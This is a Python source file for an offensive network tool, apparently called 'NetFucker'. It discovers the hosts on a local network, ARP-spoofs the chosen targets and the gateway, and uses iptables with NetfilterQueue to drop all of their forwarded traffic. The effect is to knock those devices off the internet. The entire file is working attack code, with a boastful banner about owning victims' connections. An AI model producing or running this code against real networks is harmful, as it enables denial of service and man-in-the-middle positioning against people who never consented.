from UpdaterFiles.auto_updater import current_platform, Updater
try:
    current_platform.determine_platform()
    Updater.updating()
    Updater.update_lib("scapy")
    Updater.update_lib("netifaces")
    Updater.update_lib("netfilterqueue")
    Updater.update_lib("colorama")
    Updater.update_lib("termcolor")
    import scapy.all as scapy
    import os
    import subprocess
    import netifaces
    import netfilterqueue
    from configparser import ConfigParser
    import threading
    import sys
    import time
    from colorama import init, Fore, Back, Style
    from termcolor import colored

    init()

    config = ConfigParser(allow_no_value=False, default_section="DEFAULT")

    def NeTfUcKeR():
        return Fore.WHITE + "[" + Fore.RED + "N" + Fore.YELLOW + "e" + Fore.LIGHTGREEN_EX + "t" + Fore.MAGENTA + "F" + Fore.CYAN + "u" + Fore.BLUE + "c" + Fore.RED + "K" + Fore.YELLOW + "e" + Fore.LIGHTGREEN_EX + "r" + Fore.WHITE + "]"

    def NeTfUcKeRNo_Tag():
        return Fore.RED + "N" + Fore.YELLOW + "e" + Fore.LIGHTGREEN_EX + "t" + Fore.MAGENTA + "F" + Fore.CYAN + "u" + Fore.BLUE + "c" + Fore.RED + "K" + Fore.YELLOW + "e" + Fore.LIGHTGREEN_EX + "r" + Fore.WHITE + ""

    def print_DiscoveringStage():
        print(Fore.GREEN + "==================" + Fore.GREEN + "[" + Fore.BLUE + " D " + Fore.RED + "I " + Fore.YELLOW + "S " + Fore.LIGHTGREEN_EX + "C " + Fore.MAGENTA + "O " + Fore.CYAN + "V " + Fore.BLUE + "E " + Fore.RED + "R " + Fore.YELLOW + "Y    " + Fore.CYAN + "S " + Fore.BLUE + "T " + Fore.RED + "A " + Fore.YELLOW + "G " + Fore.LIGHTGREEN_EX + "E " + Fore.GREEN + "]" + Fore.GREEN + "==================")

    def print_AttackingStage():
        print("\n" + Fore.GREEN + "==================" + Fore.GREEN + "[" + Fore.BLUE + " A " + Fore.RED + "T " + Fore.YELLOW + "T " + Fore.LIGHTGREEN_EX + "A " + Fore.MAGENTA + "C " + Fore.CYAN + "K " + Fore.BLUE + "I " + Fore.RED + "N " + Fore.YELLOW + "G    " + Fore.CYAN + "S " + Fore.BLUE + "T " + Fore.RED + "A " + Fore.YELLOW + "G " + Fore.LIGHTGREEN_EX + "E " + Fore.GREEN + "]" + Fore.GREEN + "==================", end="\r")

    def print_Important():
        print(Fore.GREEN + "==================" + Fore.GREEN + "[" + Fore.BLUE + " I " + Fore.RED + "M " + Fore.YELLOW + "P " + Fore.LIGHTGREEN_EX + "O " + Fore.MAGENTA + "R " + Fore.CYAN + "T " + Fore.BLUE + "A " + Fore.RED + "N " + Fore.YELLOW + "T " + Fore.GREEN + "]" + Fore.GREEN + "==================")


    class Appearance:
        def wut():
            return Fore.WHITE + "[" + Fore.RED + "!" + Fore.WHITE + "]"

        def huh():
            return Fore.WHITE + "[" + Fore.LIGHTBLUE_EX + "?" + Fore.WHITE + "]"

        def hey():
            return Fore.WHITE + "[" + Fore.LIGHTGREEN_EX + "+" + Fore.WHITE + "]"

        def printBanner():
            print(Fore.RED + """
                    :::!~!!!!!:.
                .xUHWH!! !!?M88WHX:.
            .X*#M@$!!  !X!M$$$$$$WWx:.
            :!!!!!!?H! :!$!$$$$$$$$$$8X:
            !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
            :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
            ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
            !:~~~ .:!M"T#$$$$WX??#MRRMMM!
            ~?WuxiW*`   `"#$$$$8!!!!??!!!
            :X- M$$$$       `"T#$T~!8$WUXU~
        :%`  ~#$$$m:        ~!~ ?$$$$$$
        :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`      ███╗   ██╗███████╗████████╗███████╗██╗   ██╗ ██████╗██╗  ██╗███████╗██████╗ 
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~       ████╗  ██║██╔════╝╚══██╔══╝██╔════╝██║   ██║██╔════╝██║ ██╔╝██╔════╝██╔══██╗
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `          ██╔██╗ ██║█████╗     ██║   █████╗  ██║   ██║██║     █████╔╝ █████╗  ██████╔╝
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!             ██║╚██╗██║██╔══╝     ██║   ██╔══╝  ██║   ██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
$R@i.~~ !     :   ~$$$$$B$$en:``              ██║ ╚████║███████╗   ██║   ██║     ╚██████╔╝╚██████╗██║  ██╗███████╗██║  ██║
?MXT@Wx.~    :     ~"##*$$$$M~                ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝      ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
            """ + Fore.LIGHTGREEN_EX + """
We DGAF about your internet connection. We own it.""")
            return True # It went through fine. Quit this function

    def has_root():
        return os.geteuid() == 0


    def gateway_address():
        gateways = netifaces.gateways()
        default_address = gateways["default"][netifaces.AF_INET][0]
        return default_address


    def connected_clients(gateway_address, ip_range):
        arp_request = scapy.ARP(pdst=ip_range)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        response = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        clients = []
        for client in response:
            client_info = {"ip" : client[1].psrc, "mac" : client[1].src}
            clients.append(client_info)
        return clients


    class ARPSpoof:
        def __init__(self, target, ip_range, gateway):
            self._to_spoof = False
            self.target = target
            self.gateway = gateway

        def send_spoof_packet(self, target, spoof_ip):
            packet = scapy.ARP(
                op=2,
                pdst=target["ip"],
                hwdst=target["mac"],
                psrc=spoof_ip
            )
            scapy.send(packet, verbose=False)

        def send_unspoof_packet(self, target, source):
            packet = scapy.ARP(
                op=2,
                pdst=target["ip"],
                hwdst=target["mac"],
                psrc=source["ip"],
                hwsrc=source["mac"]
            )
            scapy.send(packet, verbose=False)

        def start(self, threaded=True):
            self._to_spoof = True
            if threaded:
                t = threading.Thread(target=self._start)
                t.start()
                return t
            else:
                self._start()

        def _start(self):
            while True:
                if not self._to_spoof:
                    break
                self.send_spoof_packet(self.target, self.gateway["ip"])
                self.send_spoof_packet(self.gateway, self.target["ip"])
                time.sleep(1)

        def stop(self):
            self._to_spoof = False
            time.sleep(1)
            self.send_unspoof_packet(self.target, self.gateway)
            self.send_unspoof_packet(self.gateway, self.target)


    def prompt_for_targets(clients):
        for i, client in enumerate(clients, 1):
            info = "[{index}]\t\t{ip_addr}\t\t{mac_addr}".format(
                index=i,
                ip_addr=client["ip"],
                mac_addr=client["mac"]
            )
            print(Fore.LIGHTYELLOW_EX + info)
        print(Fore.RED + "Pick a target by it's number on the left")
        indices = input(colored(f"{NeTfUcKeRNo_Tag()}>", attrs=["bold"]))
        if not indices:
            return []
        indices = map(int, indices.split(","))
        targets = [clients[index-1] for index in indices]
        return targets

    class Configuration:
        def read_config():
            config.read('./Configuration/config.ini')
            return True
        def get_IP_Range():
            Configuration.read_config()
            ip_range = config["DEFAULT"]["ip_range"]
            return ip_range

    class InternetControl:
        def __init__(self):
            self.targets = []

        def add_target(self, target):
            self.targets.append(target)

        def deny(self, threaded=True):
            subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "1"])
            queue = netfilterqueue.NetfilterQueue()
            queue.bind(1, lambda packet: packet.drop())
            for target in self.targets:
                target.start()
            if threaded:
                t = threading.Thread(target=queue.run)
                t.start()
                return t
            else:
                queue.run()

        def restore(self):
            for target in self.targets:
                target.stop()
            subprocess.call(["iptables", "--flush"])


    if __name__ == '__main__':
        if not has_root():
            print(colored(F"{NeTfUcKeR()}{Appearance.wut()} Please run as Root... Quitting!!", "red"))
            sys.exit(1)
        Appearance.printBanner()
        print(colored(f"{NeTfUcKeR()}{Appearance.hey()} Running as Root", "green"))
        input(f"{NeTfUcKeR()}{Appearance.huh()} Press ENTER to continue...")
        gateway_ip = gateway_address()
        print(f"{NeTfUcKeR()}{Appearance.hey()}" + colored(" Gateway IP: {}".format(gateway_ip), "red"))
        
        ip_range = Configuration.get_IP_Range()
        clients = connected_clients(gateway_ip, ip_range)
        try:
            gateway = clients[0]
            targets = prompt_for_targets(clients[1:])
            network = InternetControl()
            for target in targets:
                print(f"{NeTfUcKeR()}{Appearance.hey()}" + colored(" Spoofing Target: {}", "green").format(target["ip"]))
                network.add_target(ARPSpoof(target, ip_range, gateway))
            try:
                network.deny(threaded=False)
            except KeyboardInterrupt:
                pass
            finally:
                network.restore()
        except IndexError:
            print(f"{NeTfUcKeR()}{Appearance.wut()} invalid IP range? Check ./Configuration/config.ini")
            quit()

except KeyboardInterrupt:
    import subprocess
    from colorama import Fore
    print("\n" + Fore.WHITE + "[" + Fore.RED + "N" + Fore.YELLOW + "e" + Fore.LIGHTGREEN_EX + "t" + Fore.MAGENTA + "F" + Fore.CYAN + "u" + Fore.BLUE + "c" + Fore.RED + "K" + Fore.YELLOW + "e" + Fore.LIGHTGREEN_EX + "r" + Fore.WHITE + "]" + Fore.WHITE + "[" + Fore.LIGHTGREEN_EX + "+" + Fore.WHITE + "]" + " Control-C press detected. Exitting!")
    subprocess.call(["iptables", "--flush"])
    quit()